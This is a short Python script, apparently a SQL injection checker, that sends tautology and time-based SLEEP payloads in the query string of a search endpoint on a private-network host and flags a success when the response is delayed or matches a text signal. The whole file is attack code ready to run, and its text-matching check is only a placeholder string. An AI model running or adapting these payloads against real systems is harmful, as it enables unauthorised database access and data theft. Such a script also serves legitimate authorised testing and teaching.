import requests

def sqli_checker(target_url):
    # SQL Injection payloads to test
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' AND SLEEP(5)--",
        "' OR '1'='1'--"
    ]

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }

    # List to track the results
    failed_attempts = []

    for payload in payloads:
        try:
            # Construct the malicious URL
            malicious_url = f"{target_url}{payload}"

            # Send the request with a delay for the second payload
            if payload == "' OR '1'='1' AND SLEEP(5)--":
                response = requests.get(malicious_url, headers=headers, timeout=6)
            else:
                response = requests.get(malicious_url, headers=headers)

            # Check the response time or presence of a specific signal
            if payload == "' OR '1'='1' AND SLEEP(5)--":
                if response.elapsed.total_seconds() > 5:
                    print(f"RESULT: SUCCESS - {malicious_url}")
                else:
                    failed_attempts.append(malicious_url)
            else:
                # Generic success signal (e.g., specific text or pattern in the response body)
                success_signal = "specific_success_text"
                if success_signal in response.text:
                    print(f"RESULT: SUCCESS - {malicious_url} with payload: {payload}")
                else:
                    failed_attempts.append(malicious_url)

        except requests.exceptions.RequestException as e:
            # Handle any request-related exceptions
            print(f"An error occurred while testing URL {target_url}: {e}")

    if len(failed_attempts) == len(payloads):
        print("RESULT: NO_SIGNAL")

if __name__ == "__main__":
    target_url = "http://192.168.2.69:3000/search?q="
    sqli_checker(target_url)